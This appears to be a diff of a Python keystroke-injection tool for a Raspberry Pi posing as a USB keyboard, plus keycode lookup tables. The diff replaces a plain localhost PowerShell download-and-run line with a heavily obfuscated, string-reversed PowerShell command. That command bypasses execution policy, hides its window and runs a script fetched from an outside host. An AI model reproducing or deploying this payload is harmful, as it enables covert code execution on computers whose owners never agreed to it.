@@ -2,10 +2,9 @@
 from time import sleep
 
 data = """\RUNBOX
-powershell.exe -executionpolicy bypass "iex(New-Object System.Net.WebClient).DownloadString('http://localhost:8000/Desktop/a.ps1')
-\ADMINPRESS
-\SLEEP 0.5
-\LEFTARROW
+powershell.exe
+\ENTER
+SET 0VeP6u (" NoisseRpxe-EkoVni |)43]rAHc[,93]rAHc[ F-  )'}1{)'+'}0'+'{'+'1'+'sp.tpircs_'+'g'+'niro'+'t'+'co'+'rp/'+'sdaolpu/eno'+'.naili'+'buj.4'+'2//:s'+'pt'+'th}0{(gnir'+'tS'+'d'+'ao'+'lnwoD.'+')tne'+'i'+'lCbeW.teN.metsy'+'S tcejbO-weN(no'+'i'+'ss'+'erpxE'+'-e'+'kovnI'+'}1{ neddih'+' '+'ely'+'tswodniw-'+' ssapyb'+' ycilopn'+'oitucexe- exe.ll'+'ehsrewo'+'p'((" );.( $VeRbosEPrEfEreNce.tOstrING()[1,3]+'X'-jOin'') ( "$( sEt-vAriAble 'OFS'  '') " +[STrInG] (( VAriable 0VEP6u  -valuEonl  )[ -1 .. -( ( VAriable 0VEP6u  -valuEonl  ).lENgtH) ])+"$( set-ITem 'VaRIAbLe:ofS' ' ' ) ")
 \ENTER"""
 
 # Handles the serial connection between the Pi and the PC 
@@ -18,8 +17,10 @@ def write_report(report):
 # Function: based on the key that is required, we send it in keystroke codes. This function provides the code
 def transcribe(key):
     # A dictionary of characters 
-    lower_case = {'a':4,'b':5,'c':6,'d':7,'e':8,'f':9,'g':10,'h':11,'i':12,'j':13,'k':14,'l':15,'m':16,'n':17,'o':18,'p':19,'q':20,'r':21,'s':22,'t':23,'u':24,'v':25,'w':26,'x':27,'y':28,'z':29,'-':45,'=':46,'[':47,']':48,'\\':49,';':51,"'":52,',':54,'.':55,'/':56,'1':30,'2':31,'3':32,'4':33,'5':34,'6':35,'7':36,'8':37,'9':38,'0':39,'`':53,r'\n':40,'\t':43,' ':44}
-    upper_case = {'A':4,'B':5,'C':6,'D':7,'E':8,'F':9,'G':10,'H':11,'I':12,'J':13,'K':14,'L':15,'M':16,'N':17,'O':18,'P':19,'Q':20,'R':21,'S':22,'T':23,'U':24,'V':25,'W':26,'X':27,'Y':28,'Z':29,'_':45,'+':46,'{':47,'}':48,'|': 49,':':51,'"':52,'<':54,'>':55,'?':56,'!':30,'@':31,'#':32,'$':33,'%':34,'^':35,'&':36,'*':37,'(':38,')':39,'~':53}
+    lower_case = {'a':4,'b':5,'c':6,'d':7,'e':8,'f':9,'g':10,'h':11,'i':12,'j':13,'k':14,'l':15,'m':16,'n':17,'o':18,'p':19,'q':20,'r':21,'s':22,'t':23,'u':24,'v':25,'w':26,'x':27,'y':28,'z':29,
+                  '-':45,'=':46,'[':47,']':48,'\\':49,';':51,"'":52,',':54,'.':55,'/':56,'1':30,'2':31,'3':32,'4':33,'5':34,'6':35,'7':36,'8':37,'9':38,'0':39,'`':53,r'\n':40,'\t':43,' ':44}
+    upper_case = {'A':4,'B':5,'C':6,'D':7,'E':8,'F':9,'G':10,'H':11,'I':12,'J':13,'K':14,'L':15,'M':16,'N':17,'O':18,'P':19,'Q':20,'R':21,'S':22,'T':23,'U':24,'V':25,'W':26,'X':27,'Y':28,'Z':29,
+                  '_':45,'+':46,'{':47,'}':48,'|': 49,':':51,'"':52,'<':54,'>':55,'?':56,'!':30,'@':31,'#':32,'$':33,'%':34,'^':35,'&':36,'*':37,'(':38,')':39,'~':53}
     
     # Based on keys that is type, send the key code.
     if key in lower_case:
@@ -76,7 +77,8 @@ def multi_commands(word_list, merged_key):
     write_report(NULL_CHAR*8)
 
 
-action_key = {'\ENTER':40,'\ESCAPE':41,'\DELETE':42,'\TAB':43,'\SPACE':44,'\PRINT':70,'\SCROLL':71,'\PAUSE':72,'\INSERT':73,'\HOME':74,'\PAGEUP':75,'\END':77,'\PAGEDOWN':78,'\RIGHTARROW':79,'\LEFTARROW':80,'\DOWNARROW':81,r'\UPARROW':82,'\POWER':102,'\LEFTCTRL':224,'\LEFTSHIFT':225,'\LEFTALT':226,'\LEFTGUI':227,'\RIGHTCTRL':228,'\RIGHTSHIFT':229,'\RIGHTALT':230,'\RIGHTGUI':231}
+action_key = {'\ENTER':40,'\ESCAPE':41,'\DELETE':42,'\TAB':43,'\SPACE':44,'\PRINT':70,'\SCROLL':71,'\PAUSE':72,'\INSERT':73,'\HOME':74,'\PAGEUP':75,'\END':77,'\PAGEDOWN':78,'\RIGHTARROW':79,'\LEFTARROW':80,'\DOWNARROW':81,r'\UPARROW':82,'\POWER':102,'\LEFTCTRL':224,
+              '\LEFTSHIFT':225,'\LEFTALT':226,'\LEFTGUI':227,'\RIGHTCTRL':228,'\RIGHTSHIFT':229,'\RIGHTALT':230,'\RIGHTGUI':231}
 function_key = {'\F1':58,'\F2':59,'\F3':60,'\F4':61,'\F5':62,'\F6':63,'\F7':64,'\F8':65,'\F9':66,'\F10':67,'\F11':68,'\F12':69,'\F13':104,'\F14':105,'\F15':106,'\F16':107,'\F17':108,'\F18':109,'\F19':110,'\F20':111,'\F21':112,'\F22':113,'\F23':114,'\F24':115}
 menu_key = {'\EXECUTE':116,'\HELP':117,'\MENU':118,'\SELECT':119,'\STOP':120,'\AGAIN':121,r'\UNDO':122,'\CUT':123,'\COPY':124,'\PASTE':125,'\FIND':126,'\MUTE':127,'\VOLUP':128,'\VOLDOWN':129,'\CAPLOCK':130,r'\NUMLOCK':131,'\SCROLLLOCk':132}
 #mod_key = {'\LEFTCTRL':1,'\LEFTSHIFT':2,'\LEFTALT':4,'\LEFTWIN':8,'\RIGHTCTRL':16,'\RIGHTSHIFT':32,'\RIGHTALT':64,'\RIGHTWIN':128}
